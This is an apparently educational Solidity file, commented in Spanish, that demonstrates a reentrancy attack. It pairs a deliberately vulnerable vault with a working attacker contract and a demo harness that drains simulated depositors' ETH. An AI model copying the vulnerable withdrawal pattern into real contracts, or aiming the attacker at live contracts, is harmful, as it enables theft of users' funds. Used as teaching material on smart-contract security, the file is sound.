// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VulnerableVault
 * @notice ❌ CÓDIGO VULNERABLE - NO USAR EN PRODUCCIÓN
 * @dev Este contrato demuestra un ataque clásico de reentrancy
 *
 * VULNERABILIDAD: La función withdraw() envía ETH ANTES de actualizar el balance
 * Esto permite que un atacante llame withdraw() recursivamente y drene el contrato
 *
 * Este es el mismo patrón que causó The DAO hack ($60M en 2016)
 */
contract VulnerableVault {

    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    /**
     * @notice Depositar ETH en el vault
     */
    function deposit() public payable {
        require(msg.value > 0, "Must deposit something");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice ❌ FUNCIÓN VULNERABLE A REENTRANCY
     * @dev El orden de operaciones es INCORRECTO:
     *      1. Verifica balance (check)
     *      2. Envía ETH (interaction) ⚠️
     *      3. Actualiza balance (effect) ⚠️ DEMASIADO TARDE
     *
     * ATAQUE:
     * - Atacante llama withdraw()
     * - Contrato envía ETH al atacante
     * - Atacante.receive() se ejecuta automáticamente
     * - Atacante llama withdraw() OTRA VEZ (balance aún no se actualizó)
     * - Ciclo se repite hasta drenar todo el ETH
     */
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        // ❌ VULNERABLE: Enviamos ETH ANTES de actualizar el estado
        // Esto da control al atacante antes de que se actualice el balance
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // ❌ DEMASIADO TARDE: El atacante ya puede haber re-entrado
        balances[msg.sender] = 0;
        emit Withdrawal(msg.sender, balance);
    }

    /**
     * @notice Obtener el balance del contrato
     */
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ReentrancyAttacker
 * @notice Contrato que explota la vulnerabilidad de reentrancy
 * @dev Demuestra cómo un atacante puede drenar fondos
 */
contract ReentrancyAttacker {

    VulnerableVault public victim;
    uint256 public attackCount;
    uint256 public maxCalls = 10; // Limitar llamadas para evitar out-of-gas

    event AttackStarted(uint256 initialBalance);
    event ReentrancyCall(uint256 callNumber, uint256 stolenAmount);
    event AttackCompleted(uint256 totalStolen);

    constructor(address _victim) {
        victim = VulnerableVault(_victim);
    }

    /**
     * @notice Iniciar el ataque
     * @dev 1. Deposita 1 ETH en el vault
     *      2. Llama withdraw() para iniciar el ciclo de reentrancy
     */
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        uint256 victimBalance = victim.getContractBalance();
        emit AttackStarted(victimBalance);

        // Depositar primero para tener balance
        victim.deposit{value: 1 ether}();

        // Iniciar el ataque
        attackCount = 0;
        victim.withdraw();

        // Al terminar, transferir todo el ETH robado al atacante
        uint256 stolen = address(this).balance;
        emit AttackCompleted(stolen);

        (bool success, ) = msg.sender.call{value: stolen}("");
        require(success, "Failed to transfer stolen funds");
    }

    /**
     * @notice ⚠️ FUNCIÓN CLAVE DEL ATAQUE
     * @dev Esta función se ejecuta automáticamente cuando el contrato recibe ETH
     *
     * EXPLOTACIÓN:
     * 1. VulnerableVault.withdraw() envía ETH a este contrato
     * 2. receive() se ejecuta automáticamente
     * 3. Mientras el balance en VulnerableVault AÚN NO se actualizó...
     * 4. Llamamos withdraw() OTRA VEZ
     * 5. Repetir hasta drenar todo el ETH o alcanzar límite de gas
     */
    receive() external payable {
        attackCount++;
        emit ReentrancyCall(attackCount, msg.value);

        // Continuar el ataque si:
        // 1. El vault aún tiene fondos
        // 2. No hemos alcanzado el límite de llamadas
        // 3. Tenemos gas suficiente
        if (victim.getContractBalance() >= 1 ether && attackCount < maxCalls) {
            victim.withdraw(); // ⚠️ REENTRANCY ATTACK
        }
    }

    /**
     * @notice Ver cuánto ETH robamos
     */
    function getStolenAmount() public view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Permitir recibir ETH
     */
    fallback() external payable {}
}

/**
 * @title ReentrancyDemo
 * @notice Contrato para demostrar el ataque completo
 */
contract ReentrancyDemo {

    VulnerableVault public vault;
    ReentrancyAttacker public attacker;

    event SetupComplete(address vault, address attacker);
    event UserDeposit(address user, uint256 amount);
    event AttackResult(uint256 initialBalance, uint256 finalBalance, uint256 stolen);

    /**
     * @notice Setup: Desplegar vault vulnerable y atacante
     */
    function setup() public {
        vault = new VulnerableVault();
        attacker = new ReentrancyAttacker(address(vault));
        emit SetupComplete(address(vault), address(attacker));
    }

    /**
     * @notice Simular usuarios honestos depositando fondos
     */
    function simulateHonestUsers() public payable {
        require(msg.value >= 5 ether, "Need at least 5 ETH");

        // Simular 5 usuarios depositando 1 ETH cada uno
        for (uint i = 0; i < 5; i++) {
            vault.deposit{value: 1 ether}();
        }
        emit UserDeposit(address(this), msg.value);
    }

    /**
     * @notice Ejecutar el ataque completo
     */
    function executeAttack() public payable {
        require(msg.value >= 1 ether, "Attacker needs 1 ETH");

        uint256 initialBalance = vault.getContractBalance();

        // El atacante ejecuta el exploit
        attacker.attack{value: msg.value}();

        uint256 finalBalance = vault.getContractBalance();
        uint256 stolen = initialBalance - finalBalance;

        emit AttackResult(initialBalance, finalBalance, stolen);
    }

    /**
     * @notice Permitir recibir ETH
     */
    receive() external payable {}
}

/**
 * CÓMO USAR ESTA DEMO:
 *
 * 1. Desplegar ReentrancyDemo
 * 2. Llamar setup() para crear vault y atacante
 * 3. Llamar simulateHonestUsers() con 5 ETH
 *    - Esto simula 5 usuarios depositando 1 ETH cada uno
 *    - Total en vault: 5 ETH
 * 4. Llamar executeAttack() con 1 ETH
 *    - El atacante deposita 1 ETH
 *    - Luego explota reentrancy
 *    - Roba los 5 ETH de usuarios honestos + recupera su 1 ETH
 *
 * RESULTADO ESPERADO:
 * - Vault inicial: 5 ETH (de usuarios honestos)
 * - Atacante invierte: 1 ETH
 * - Atacante roba: 6 ETH total
 * - Vault final: 0 ETH (drenado completamente)
 *
 * LECCIONES:
 * - Un solo usuario malicioso puede drenar TODOS los fondos
 * - El ataque es trivial de ejecutar
 * - La vulnerabilidad es fácil de introducir accidentalmente
 * - En Cadence, este ataque es IMPOSIBLE por diseño del lenguaje
 */
